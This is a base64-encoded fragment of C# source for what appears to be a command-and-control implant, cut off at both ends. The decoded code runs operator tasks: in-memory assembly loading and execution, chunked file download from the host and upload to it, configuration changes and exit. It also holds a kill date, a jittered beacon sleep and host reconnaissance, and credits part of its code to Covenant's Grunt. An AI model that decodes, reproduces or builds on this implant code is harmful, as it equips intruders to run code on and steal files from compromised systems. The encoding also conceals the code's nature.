YWQoKCkgPT4gRXhlY3V0ZVRhc2tpbmcoSm9iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZC5TdGFydCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuam9iX3N0YXJ0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudGhyZWFkID0gdGhyZWFkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5jb21tYW5kID09ICJ1cGxvYWQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtzLkNvdW50ID09IDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyZWFkIHRocmVhZCA9IG5ldyBUaHJlYWQoKCkgPT4gRXhlY3V0ZVRhc2tpbmcoSm9iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZC5TdGFydCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudGhyZWFkID0gdGhyZWFkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5kb3dubG9hZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmZpbGVfaWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghU3lzdGVtLklPLkZpbGUuRXhpc3RzKEpvYi5wYXJhbWV0ZXJzKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkVycm9yIGZpbGUgZG9lcyBub3QgZXhpc3RzIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi50b3RhbF9jaHVua3MgPSAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnBhdGggPSBNb2R1bGVzLkRvd25sb2FkLkdldFBhdGgoSm9iLnBhcmFtZXRlcnMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnRvdGFsX2NodW5rcyA9IChpbnQpTW9kdWxlcy5Eb3dubG9hZC5HZXRUb3RhbENodW5rcyhKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuZmlsZV9zaXplID0gTW9kdWxlcy5Eb3dubG9hZC5HZXRGaWxlU2l6ZShKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY2h1bmtzLkNvdW50ID4gMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGVjdXRlVGFza2luZyhKb2IpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaHJlYWQgdGhyZWFkID0gbmV3IFRocmVhZCgoKSA9PiBFeGVjdXRlVGFza2luZyhKb2IpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHJlYWQuU3RhcnQoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuam9iX3N0YXJ0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi50aHJlYWQgPSB0aHJlYWQ7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBFeGVjdXRlVGFza2luZyhKb2IgSm9iKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzd2l0Y2ggKEpvYi5jb21tYW5kLlRvTG93ZXIoKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImxvYWRhc3NlbWJseSI6DQogICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gYXNzZW1ibHkgPSBNb2R1bGVzLkdldEFzc2VtYmx5KEpvYi5jaHVua3MsIEpvYi50b3RhbF9jaHVua3MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE1vZHVsZXMuTG9hZChKb2IuZmlsZV9pZCwgQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhhc3NlbWJseSkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJhc3NlbWJseSBzdWNjZXNzZnVsbHkgbG9hZGVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gImFzc2VtYmx5IGNvdWxkIG5vdCBiZSBsb2FkZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAicnVuYXNzZW1ibHkiOg0KICAgICAgICAgICAgICAgICAgICAgICAgUnVuQXNzZW1ibHkgcnVuQXNzZW1ibHkgPSBSdW5Bc3NlbWJseS5Gcm9tSnNvbihKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIU1vZHVsZXMuQ2hlY2socnVuQXNzZW1ibHkuYXNzZW1ibHlfaWQpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJhc3NlbWJseSBub3QgbG9hZGVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nW10gYXJncyA9IG5ldyBzdHJpbmdbXSB7IH07DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocnVuQXNzZW1ibHkuYXJncy5MZW5ndGggPj0gMikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcmdzID0gcnVuQXNzZW1ibHkuYXJncy5TcGxpdCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3MgPSBuZXcgc3RyaW5nW10geyBydW5Bc3NlbWJseS5hcmdzIH07DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgcmVzcG9uc2UgPSBNb2R1bGVzLkludm9rZShydW5Bc3NlbWJseS5hc3NlbWJseV9pZCwgYXJncyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2UuTGVuZ3RoIDwgQ29uZmlnLkNodW5rU2l6ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSByZXNwb25zZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudG90YWxfY2h1bmtzID0gKHJlc3BvbnNlLkxlbmd0aCArIENvbmZpZy5DaHVua1NpemUgLSAxKSAvIENvbmZpZy5DaHVua1NpemU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGNvdW50ID0gMDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoY291bnQgIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCArIDEgPT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHNpemUgPSByZXNwb25zZS5MZW5ndGggLSAoY291bnQgKiBDb25maWcuQ2h1bmtTaXplKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuQWRkKHJlc3BvbnNlLlN1YnN0cmluZygoc2l6ZSksIGNvdW50KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3VudCsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5BZGQocmVzcG9uc2UuU3Vic3RyaW5nKChjb3VudCAqIENvbmZpZy5DaHVua1NpemUpLCBDb25maWcuQ2h1bmtTaXplKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3VudCsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnJlc3BvbnNlICE9ICJcclxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJsaXN0bG9hZGVkIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghQ29uZmlnLk1vZHVsZXMuQW55KCkpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIm5vIGFzc2VtYmxpZXMgbG9hZGVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIEFzc2VtYmxpZXMgPSBNb2R1bGVzLkxpc3RBc3NlbWJsaWVzKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSBBc3NlbWJsaWVzOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAiZG93bmxvYWQiOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jaHVua19udW0gIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgY2h1bmsgPSBNb2R1bGVzLkRvd25sb2FkLkdldENodW5rKEpvYi5wYXJhbWV0ZXJzLCBKb2IuY2h1bmtfbnVtLCBKb2IudG90YWxfY2h1bmtzLCBKb2IuZmlsZV9zaXplKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtzLkFkZChjaHVuayk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rX251bSsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgInVwbG9hZCI6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLndyaXRlX251bSA9PSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChTeXN0ZW0uSU8uRmlsZS5FeGlzdHMoSm9iLnBhdGgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkVycm9yIGZpbGUgYWxyZWFkeSBleGlzdHMiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rcy5Db3VudCAhPSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKE1vZHVsZXMuVXBsb2FkKEpvYi5wYXRoLCBKb2IuY2h1bmtzWzBdKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi53cml0ZV9udW0rKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5SZW1vdmUoSm9iLmNodW5rc1swXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi53cml0ZV9udW0gPT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJjb25maWciOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5wYXJhbWV0ZXJzLlRvTG93ZXIoKSA9PSAiaW5mbyIpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gTW9kdWxlcy5HZXRDb25maWcoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmKE1vZHVsZXMuU2V0Q29uZmlnKEpvYi5wYXJhbWV0ZXJzLlRvTG93ZXIoKSkpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkNvbmZpZ3VyYXRpb24gc3VjY2Vzc2Z1bGx5IHVwZGF0ZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiRXJyb3IgY291bGQgbm90IHVwZGF0ZSBjb25maWciOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAiZXhpdCI6DQogICAgICAgICAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImpvYnMiOg0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImpvYmtpbGwiOg0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ29tbWFuZCBub3QgaW1wbGVtZW50ZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIFJlbW92ZUpvYihKb2IgSm9iLCBKb2JMaXN0IEpvYkxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAiZG93bmxvYWQiKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgSm9iTGlzdC5qb2JzLlJlbW92ZShKb2IpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBKb2IudGhyZWFkLkFib3J0KCk7DQogICAgICAgICAgICAgICAgICAgIEpvYkxpc3Quam9icy5SZW1vdmUoSm9iKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBDaGVja0RhdGUoKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIERhdGVUaW1lIGtpbGwgPSBEYXRlVGltZS5QYXJzZShDb25maWcuS2lsbERhdGUpOw0KICAgICAgICAgICAgICAgIERhdGVUaW1lIGRhdGUgPSBEYXRlVGltZS5Ub2RheTsNCiAgICAgICAgICAgICAgICBpZiAoRGF0ZVRpbWUuQ29tcGFyZShraWxsLCBkYXRlKSA+PSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50IEdldER3ZWxsVGltZSgpDQogICAgICAgIHsNCiAgICAgICAgICAgIGRvdWJsZSBIaWdoID0gQ29uZmlnLlNsZWVwICsgKENvbmZpZy5TbGVlcCAqIChDb25maWcuSml0dGVyICogMC4wMSkpOw0KICAgICAgICAgICAgZG91YmxlIExvdyA9IENvbmZpZy5TbGVlcCAtIChDb25maWcuU2xlZXAgKiAoQ29uZmlnLkppdHRlciAqIDAuMDEpKTsNCiAgICAgICAgICAgIFJhbmRvbSByYW5kb20gPSBuZXcgUmFuZG9tKCk7DQogICAgICAgICAgICBpbnQgRHdlbGwgPSByYW5kb20uTmV4dChDb252ZXJ0LlRvSW50MzIoTG93KSwgQ29udmVydC5Ub0ludDMyKEhpZ2gpKTsNCiAgICAgICAgICAgIHJldHVybiBEd2VsbCAqIDEwMDA7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRJUEFkZHJlc3MoKQ0KICAgICAgICB7DQogICAgICAgICAgICBJUEhvc3RFbnRyeSBIb3N0ID0gZGVmYXVsdChJUEhvc3RFbnRyeSk7DQogICAgICAgICAgICBzdHJpbmcgSG9zdG5hbWUgPSBudWxsOw0KICAgICAgICAgICAgSG9zdG5hbWUgPSBTeXN0ZW0uRW52aXJvbm1lbnQuTWFjaGluZU5hbWU7DQogICAgICAgICAgICBIb3N0ID0gRG5zLkdldEhvc3RFbnRyeShIb3N0bmFtZSk7DQogICAgICAgICAgICBzdHJpbmcgaXAgPSAiIjsNCiAgICAgICAgICAgIGZvcmVhY2ggKElQQWRkcmVzcyBJUCBpbiBIb3N0LkFkZHJlc3NMaXN0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChJUC5BZGRyZXNzRmFtaWx5ID09IFN5c3RlbS5OZXQuU29ja2V0cy5BZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlwID0gQ29udmVydC5Ub1N0cmluZyhJUCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGlwOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0QXJjaCgpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyBhcmNoID0gIiI7DQogICAgICAgICAgICBpZiAoSW50UHRyLlNpemUgPT0gOCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBhcmNoID0gIng2NCI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgYXJjaCA9ICJ4ODYiOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGFyY2g7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRTZXNzaW9uSWQoKQ0KICAgICAgICB7DQogICAgICAgICAgICBSYW5kb20gcmFuZG9tID0gbmV3IFJhbmRvbSgpOw0KICAgICAgICAgICAgY29uc3Qgc3RyaW5nIGNoYXJzID0gIkFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OSI7DQogICAgICAgICAgICByZXR1cm4gbmV3IHN0cmluZyhFbnVtZXJhYmxlLlJlcGVhdChjaGFycywgMjApLlNlbGVjdChzID0+IHNbcmFuZG9tLk5leHQocy5MZW5ndGgpXSkuVG9BcnJheSgpKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIFN0b2xlIGZyb20gQ292ZW5hbnQncyBHcnVudA0KICAgICAgICAvLyBBZGFwdGVkIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL21vbm8vbW9uby9ibG9iL21hc3Rlci9tY3MvY2xhc3MvU3lzdGVtLldlYi9TeXN0ZW0uV2ViL0h0dHBVdGlsaXR5LmNzDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoc3RyaW5nIHZhbHVlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoU3RyaW5nLklzTnVsbE9yRW1wdHkodmFsdWUpKSB7IHJldHVybiBTdHJpbmcuRW1wdHk7IH0NCiAgICAgICAgICAgIGludCBsZW4gPSB2YWx1ZS5MZW5ndGg7DQogICAgICAgICAgICBib29sIG5lZWRFbmNvZGUgPSBmYWxzZTsNCiAgICAgICAgICAgIGNoYXIgYzsNCiAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgbGVuOyBpKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgYyA9IHZhbHVlW2ldOw0KICAgICAgICAgICAgICAgIGlmIChjID49IDAgJiYgYyA8PSAzMSB8fCBjID09IDM0IHx8IGMgPT0gMzkgfHwgYyA9PSA2MCB8fCBjID09IDYyIHx8IGMgPT0gOTIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBuZWVkRW5jb2RlID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCFuZWVkRW5jb2RlKSB7IHJldHVybiB2YWx1ZTsgfQ0KDQogICAgICAgICAgICB2YXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOw0KICAgICAgICAgICAgZm9yIChpbn